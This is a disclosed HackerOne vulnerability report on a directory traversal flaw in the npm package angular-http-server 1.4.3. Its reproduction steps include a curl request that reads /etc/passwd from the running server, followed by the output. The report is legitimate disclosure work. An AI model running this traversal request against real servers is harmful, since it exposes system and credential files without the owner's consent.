# [angular-http-server] Server Directory Traversal

## Report Details
- **Report ID**: 330349
- **URL**: https://hackerone.com/reports/330349
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-03-27T13:21:46.953Z
- **Disclosed**: 2018-04-26T05:42:34.174Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Server Directory Traversal vulnerability in angular-http-server.
It allows reading local files on the target server.

# Module

**module name:** angular-http-server
**version:** 1.4.3
**npm page:** `https://www.npmjs.com/package/angular-http-server`

## Module Description

A very simple application server designed for Single Page App (SPA) developers.

It returns a file to the browser if it exists (ex. your-icon.png, index.html) and if can't find a file that matches a given URL it re-directs you to index.html rather than giving a 404 error. The only time it will error out is if it can't locate the index.html file.

Originally designed for my Angular work, this server will work with any Single Page App (SPA) framework that uses a router to change the URL (React, Vue JS, Elm,...).

## Steps To Reproduce:

* Install the module:

`$ npm i angular-http-server`

* Create the index file:

`$ echo "hi" > index.html`

* Start the server:

`$ ./node_modules/angular-http-server/angular-http-server.js -p 6060`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:6060//etc/passwd'

##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
...
```

## Supporting Material/References:

* node v8.10.0
* npm 5.6.0
* curl 7.54.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

It allows reading local files on the target server

## Attachments
No attachments
